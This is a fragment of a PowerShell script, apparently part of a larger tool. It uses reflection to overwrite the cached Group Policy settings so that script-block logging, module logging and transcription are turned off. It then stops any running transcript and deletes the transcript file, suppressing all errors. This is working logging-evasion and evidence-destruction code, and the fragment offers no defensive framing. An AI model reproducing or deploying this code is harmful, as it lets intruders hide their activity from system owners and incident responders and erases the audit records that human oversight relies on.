	# Disable Group Policy logging cache (reflection) and stop any active transcript
	try {
		$groupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField(
			'cachedGroupPolicySettings', 'NonPublic,Static')
		if ($groupPolicySettingsField) {
			$groupPolicySettings = $groupPolicySettingsField.GetValue($null)
			if ($groupPolicySettings) {
				foreach ($key in @('ScriptBlockLogging', 'ModuleLogging', 'Transcription')) {
					if ($groupPolicySettings.ContainsKey($key)) {
						foreach ($prop in @($groupPolicySettings[$key].Keys)) {
							$groupPolicySettings[$key][$prop] = if ($prop -eq 'OutputDirectory') { '' } else { 0 }
						}
					}
				}
				if ($script:DebugMode) { Add-DebugLogEntry "GP logging cache neutralized" }
			}
		}
	} catch {}

	# Stop active transcript
	try {
		$transcriptOutput = Stop-Transcript *>&1 | Out-String
		if ($transcriptOutput -match 'output file is\s+(.+?)(\r?\n|$)') {
			$transcriptPath = $Matches[1].Trim()
			if (Test-Path $transcriptPath) {
				Remove-Item $transcriptPath -Force -ErrorAction SilentlyContinue
			}
		}
	} catch {}
